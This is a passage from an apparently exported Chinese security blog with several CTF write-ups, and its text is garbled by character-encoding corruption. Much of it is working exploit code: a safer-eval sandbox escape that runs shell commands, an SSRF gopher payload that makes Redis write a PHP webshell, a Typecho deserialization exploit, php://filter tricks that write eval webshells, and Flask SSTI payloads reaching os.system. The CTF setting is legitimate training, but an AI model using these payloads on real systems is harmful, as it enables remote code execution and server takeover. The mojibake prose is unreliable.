res.send(String(response));&#125;); ä¸‹é¢ä½¿ç”¨äº†saferEvalçš„ä»£ç ï¼Œæ¥æ”¶eçš„å‚æ•°ï¼Œäºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ¸…æ™°ï¼Œé¦–å…ˆå°è¯•ç»•è¿‡å¯¹è¶…æ—¶çš„é™åˆ¶ï¼Œå†æœä¸€ä¸‹saferEvalçš„æ•°æ®~ï¼Œæ–‡æ¡£è¯´åˆ°ï¼š 1parseInt(string, radix) å‚æ•° æè¿° string å¿…éœ€ã€‚è¦è¢«è§£æçš„å­—ç¬¦ä¸²ã€‚ radix å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æã€‚å¦‚æœå®ƒä»¥ â€œ0xâ€ æˆ– â€œ0Xâ€ å¼€å¤´ï¼Œå°†ä»¥ 16 ä¸ºåŸºæ•°ã€‚å¦‚æœè¯¥å‚æ•°å°äº 2 æˆ–è€…å¤§äº 36ï¼Œåˆ™ parseInt() å°†è¿”å› NaNã€‚ è¿™ä¹Ÿå°±è¯´æ˜ï¼Œå¦‚æœä¼ å…¥delayæ˜¯å¾ˆå¤§å¾ˆå¤§çš„æ•°ï¼Œä¹Ÿå°±ä¸èƒ½è¢«è§£æäº†ï¼Œé‚£æˆ‘ä»¬çš„delayæ­¤æ—¶å˜æˆäº†1ç§’ï¼Œä¹Ÿå°±ç»•è¿‡äº†è¶…æ—¶é™åˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œå’¯ï¼Œå°è¯•ï¼š å‘ç°æ­¤æ—¶å°±ç»•è¿‡äº†è¶…æ—¶çš„é™åˆ¶äº†ï¼ï¼Œäºæ˜¯å†æ„é€ æ‰§è¡ŒEvalSaferçš„ä»£ç ï¼ŒæŸ¥åˆ°æ˜¯CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payloadå¦‚ä¸‹ï¼š 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); å…¶ä¸­æ ¸å¿ƒä»£ç å°±æ˜¯theFunctionï¼Œæˆ‘ä»¬ä¼ å…¥è¿›å»æ±¡æŸ“å‚æ•°å³å¯æ‰§è¡Œä»£ç  4.EzWebæ˜¯ä¸€ä¸ªredisçš„é¢˜ç›®..æ²¡æœ‰åšè¿‡è¿™æ ·çš„ï¼Œç¡¬ç€å¤´çš®åšå§ï¼Œè®¿é—®ä¹‹åæ ¹æ®æç¤ºè®¿é—® ?secret æŸ¥è¯¢äº†ä¸€äº›ï¼Œè¿™æ˜¯å†…ç½‘çš„ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶é¢˜ç›®è¿‡æ»¤äº†127.0.0.1,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶ä»–é¶æœºçš„å†…å®¹ è®¿é—®è¿‡å»ä¹‹åå¥½åƒä¹Ÿä¸æ˜¯å•¥ç©æ„å„¿å•Š,å°è¯•ç”¨fileåè®®çš„æ¼æ´è¯»åˆ°äº†index.phpçš„æºç ï¼š file:[ç©ºæ ¼]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;æäº¤ 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;åˆ«è¿™æ ·&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; æˆ‘ä»¬å‘ç°è¿‡æ»¤äº†dictåè®®ï¼Œfileåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ï¼Œæˆ‘ä»¬çŒœæƒ³å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œgopheråè®®è¿›è¡Œæ”»å‡»,æœç„¶ï¼Œåœ¨11ç«¯å£ä¸Šæ‰¾åˆ°äº†å˜åŒ– è®©æˆ‘ä»¬å°è¯•æœåŠ¡ï¼Œå› ä¸ºssrfå¸¸ç”¨çš„å‡ ä¸ªæœåŠ¡å°±æ˜¯mysqlå’Œredisï¼Œäºæ˜¯åˆ†åˆ«è®¿é—®3306ç«¯å£å’Œ6379ç«¯å£ 6379ä¸Šå¾—åˆ°ï¼š å‘ç°æœç„¶æœ‰ERRç«¯å£ï¼Œäºæ˜¯å°è¯•ç”¨gopheråè®®æ‰“ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†ä¸€æ³¢åˆ«äººçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // è¿è¡Œæœ‰redisçš„ä¸»æœºipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸»æœºIPä¸º:10.160.187.11 å¾—åˆ°payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZä¸‰å‰‘å®¢-EzTypechoè¿™é“é¢˜ç›®ï¼Œå‘ƒï¼ŒåŸç†æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥å´å¾ˆç®€å•ï¼Œæ¯”å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html expå°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ç›´æ¥åœ¨finishæ—¶ä¼šå‘ç°æ— æ³•åˆ©ç”¨çš„æƒ…å†µ è¿™ä¸ªæ—¶å€™å°±å¿…é¡»çœ‹æºç äº† æŸ¥æ‰¾sessionï¼Œåœ¨æºç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; æˆ‘ä»¬å»æŸ¥æ‰¾sesionåœ¨å“ªé‡Œèµ‹å€¼ï¼š ç»“æœå‘ç°ä¸€æ—¦åœ¨è¿™é‡Œå°±è¢«exitåœä¸‹æ¥äº†ï¼Œäºæ˜¯æŸ¥æ‰¾startï¼Œç»“æœå‘ç°æºç å½“ä¸­ï¼š 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); å‘ç°å®ƒå±…ç„¶æ¥æ”¶ä¸€ä¸ªå‚æ•°â€¦é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç”¨è¿™ä¸ªå»æ‰“å°±è¡Œäº†ï¼Œåˆ©ç”¨è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); æ‹¿åˆ°flagï¼š æ€»ç»“ï¼šâ€‹ é¢˜ç›®è™½ç„¶åŸç†éƒ½å¾ˆéš¾ï¼Œä½†æ˜¯åˆ©ç”¨å´å¾ˆç®€å•ï¼Œè‡ªå·±å…ˆæŠŠé¢˜ç›®æˆåŠŸçš„å¤ç°æ¥å‡ºæ¥äº†ï¼Œä»¥åå†é€æ­¥å¤ç°åŸç†æŠŠã€‚","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"}]},{"title":"å…¨å›½å·¥æ§2020-web-easyphp","slug":"å…¨å›½å·¥æ§2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-11-17T06:15:26.691Z","comments":true,"path":"2020/10/27/å…¨å›½å·¥æ§2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"å…¨å›½å·¥æ§2020-web-easyphp1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œè¯¥åè®®æµå…è®¸æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œ åœ¨ä¹‹å‰ä¸‰ä¸ªç™½å¸½ä¸­æœ‰ä¸€ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„ä»£ç ï¼š 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œå¦‚æœæ­£å¸¸çš„ç¼–è¯‘ä»£ç ï¼Œç”±äºåœ¨å¼€å¤´åŠ å…¥äº†exitå†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥äº†ä¸€å¥è¯ä¹Ÿæ— æ³•è§£æã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡filenameåœ¨phpå†™å…¥çš„æ—¶å€™æ„é€ åè®®ï¼Œæ‰€ä»¥åˆ©ç”¨base64-decodeæ–¹æ³•è§£ç æ„é€ ä¸€å¥è¯çš„payloadï¼š 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¼šå‘ç°å¦‚æœç›´æ¥æ‰“å…¥è¿›å»ï¼Œbase64è§£ææ²¡æœ‰æˆåŠŸï¼Œè¿™å°±æ˜¯å› ä¸ºbaseæ˜¯ç”±4å­—èŠ‚ç»„æˆä¸€æ¬¡payloadã€‚æ‰€ä»¥è¯è¯´å›å»ï¼Œ å½“æˆ‘ä»¬ä½¿ç”¨base64decodeåè®®çš„æ—¶å€™ï¼Œ&lt; ? ; ?&gt;ç­‰ç­‰éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥æºä»£ç åˆ™ä¼šè¢«è¯†åˆ«ä¸ºï¼š phpexitï¼Œè€Œbase64æ˜¯å››ä¸ªå­—èŠ‚è¿˜åŸæˆä¸€ä¸ªå­—æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦å†å ä¸€ä¸ªä½æ•°ï¼Œç»™å¥¹ï¼Œä¹Ÿå°±æ˜¯phpexit[?]æ„é€ æˆå…«ä¸ªå­—èŠ‚ä¾›basedecodeä½¿ç”¨ï¼Œä¹‹ååœ¨åé¢å†ç¼–ä¸Šæˆ‘ä»¬è‡ªå·±çš„payloadï¼Œæ‰€ä»¥è¿™é“é¢˜å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== ä½†æ˜¯è¿™é‡Œä»éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ„é€ çš„æ—¶å€™payloadå½“ä¸­ä¸å…è®¸å‡ºç°+å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™ä¼šé‡è§æ²¡æœ‰è¢«å†™ä¸Šå»æƒ…å†µã€‚ï¼Œå®é™…ä¸Šï¼Œé™¤äº†baseè¿‡æ»¤å™¨ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä¾›ç»™æˆ‘ä»¬ä½¿ç”¨ï¼š å®˜ç½‘ï¼š 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php è½¬æ¢è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php å­—ç¬¦è¿‡æ»¤å™¨ 2.rot13é™¤æ­¤ä¹‹å¤–æˆ‘å°è¯•ä½¿ç”¨rot13æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¼šå‘ç°rot13ä¹‹åçš„ç»“æœä¸åˆæ³• 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; å¾—åˆ°phpä¸ºï¼š 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; è¿™æ ·çš„è¯ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªåˆ†å·ï¼Œè€Œå¯¼è‡´å¤±è´¥äº†ï¼ˆå¼€å¯çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œåªè¦ç”¨&lt;? ?&gt;ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æï¼‰ä½†å¦‚æœå…³é—­çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼š 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php æˆåŠŸï¼é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¡¥å……ä¸€ç§éªšæ€è·¯ï¼š 3.iconvå­—ç¬¦ç¼–ç è½¬æ¢1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconvå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå½“å‰ç¼–ç ï¼Œè½¬æ¢åç¼–ç ï¼Œä¹‹åå†è½¬å›å»ï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åå…¶é“è¡Œä¹‹ã€‚ä½†æ˜¯åœ¨è¿™é‡Œï¼Œåˆ©ç”¨è¯¥å­—ç¬¦ç¼–ç ï¼Œä¼šå¯¼è‡´å‡ºç°ä¹‹å‰çš„+å·çš„é—®é¢˜ï¼Œäºæ˜¯å°±å¤±è´¥äº† 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- æ ¹æ®å¤§ä½¬ç»™å‡ºçš„UCS2-2 ç¼–ç çš„æ–¹å¼ï¼š 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUCS2çš„ç¼–ç æ–¹å¼æ˜¯2ä½ä¸€æ¬¡è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä¿è¯éœ€è¦è½¬æ¢çš„ç¼–ç ä¸º2ä½æ•°ï¼Œä¸å¤Ÿçš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½,è€Œæˆ‘ä»¬ä¸Šé¢çš„è½¬æ¢ä¹‹åç›´æ¥ç”¨çš„è¯ï¼Œä¼šå‘ç°æ— æ³•è½¬æ¢ï¼Œè¿™æ˜¯å› ä¸ºå¿…é¡»ä¿è¯&lt;?php exit();ä¹Ÿè¢«æˆåŠŸè½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å‰é¢å†åŠ ä¸Šä¸€ä¸ª1å³å¯ï¼Œ æœ€ç»ˆpayloadï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? å†™å…¥shellï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.ç»„åˆä½¿ç”¨ï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? è¿˜å¯ä»¥å°è¯•ä½¿ç”¨srtip_tags+base64çš„æ–¹å¼è¿›è¡Œç»•è¿‡ 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg== ç»è¿‡è¯¥æ–¹å¼æ„é€ çš„payloadï¼Œä¼šè¿›è¡Œstrip_tagsï¼Œå»é™¤æ‰äº†å‰é¢çš„å†…å®¹ï¼Œä¹‹åå†ç”¨base64è§£å‹äº†æˆ‘ä»¬çš„å†…å®¹ã€‚ è®²å®Œä¸Šé¢çš„ï¼Œå†å›åˆ°wmctfçš„check in2ï¼Œé¢˜ç›®çš„æºç ä¸ºï¼š 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; è¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªå‰©ä¸‹äº†å‹ç¼©è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡zlib.inflateè§£å‹å­—ç¬¦ï¼Œä¹‹åå†åˆ©ç”¨zlib.deflateå‹ç¼©çš„æ–¹å¼getshellï¼Œstr.tolowerä¼šåœ¨ 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŒæ¬¡ç¼–ç ç»•è¿‡çš„æ–¹å¼ 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php è€Œæ˜¨å¤©çš„æ¯”èµ›è¿‡æ»¤äº†tolower,upperç­‰ç­‰ï¼Œç”šè‡³åˆæŠŠ%è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç”¨ä¸Šé¢ä¸¤ä¸ªpayloadäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨zlibçš„ deflateï¼Œä¹‹åå†åˆ©ç”¨urlç¼–ç è§£æï¼Œå¾—å‡ºå¦‚ä¸‹payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2021-05-10T13:43:42.040Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš","text":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš 1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„ç¬¬ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æ­å»ºæˆ‘ä»¬çš„ç¯å¢ƒï¼š 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) è¿™ç§å°±æ˜¯æœ€åŸºæœ¬çš„flaskï¼Œåœ¨flaskå½“ä¸­jinjiaçš„æ¨¡æ¿ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªèŠ±æ‹¬å·å°±å¯ä»¥å…è®¸ä¸€äº›åŸºæœ¬çš„è¿ç®— ç”¨äºæ‰§è¡Œifï¼Œforå¾ªç¯ç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªæœ€åŸºæœ¬çš„payloadçš„æ„é€ æ–¹å¼æ˜¯è¯¥æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œä»configç±»è§¦å‘ï¼Œå› ä¸ºFlaské‡Œé¢è‡ªå¸¦ 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; é€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„flaskçš„config~ï¼Œè€Œè¿™ä¸€çš„æ„ä¹‰å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Ÿæˆ‘ä»¬å¾—ä¸åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä½œä¸ºè·³æ¿ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥ 1.__class__.__init__ __classæ–¹æ³•å±æ€§çš„æ—¶å€™ä¼šåªæƒ³è¯¥å®ä¾‹å¯¹åº”çš„ç±»ï¼Œæ­¤æ—¶configçš„ç±»æ˜¯Config,ç„¶åå¯ä»¥å†å»è°ƒç”¨å…¶å®ƒç±»å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å®¡è®¡äº†æºç ï¼Œå°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æ­¤æ—¶çš„Configç±»ä½äºconfig.py80å¤šè¡Œï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ__init__ä¹‹åï¼Œä¾¿å¯ä»¥åœ¨ä¸‹é¢çš„101è¡Œæ‰¾åˆ°è¿™ä¹ˆä¸€è¡Œä»£ç ï¼š 1rv = os.environ.get(variable_name) ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„configç±»å½“ä¸­å«æœ‰osåº“çš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ˜¯ä¸è¡Œçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡globalså‡½æ•°å…ˆè·å–åˆ°å®ƒï¼Œäºæ˜¯å¾—åˆ°ï¼š globals() å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡,åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼š 1__globals__ äºæ˜¯æˆ‘ä»¬æ‹¼æ¥å¾—åˆ°å¦‚ä¸‹çš„payload: 1config.__class__.__init__.__globals__ å¯ä»¥å¾—åˆ°ï¼š æˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼æ¥è·å–osåº“ï¼Œåˆ©ç”¨__dictè¿™ä¸ªæ–¹æ³•æ¥æŸ¥çœ‹osåº“å“ªäº›å¯ä»¥ç»™æˆ‘ä»¬è¿›è¡Œä½¿ç”¨ 1.__globals__[&#x27;os&#x27;] æˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°systemï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨è¯¥æ–¹æ³•å´æ— æ³•å¾—åˆ°å›æ˜¾ï¼Œè¯¥æ–¹æ³•åªä¸è¿‡æ˜¯æˆåŠŸçš„æ—¶å€™è¿”å›1ï¼Œå¤±è´¥äº†åˆ™æ˜¯è¿”å›0 æ‰§è¡Œå¦‚ä¸‹ï¼š 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; å¾—åˆ°1æˆ–è€…0å¯¹äºæˆ‘ä»¬æ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œå½“ç„¶è¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨ã€ï¼Œè€Œpopenåˆ™å¯ä»¥è¿”å›æ–‡ä»¶å¯¹è±¡ os.popen 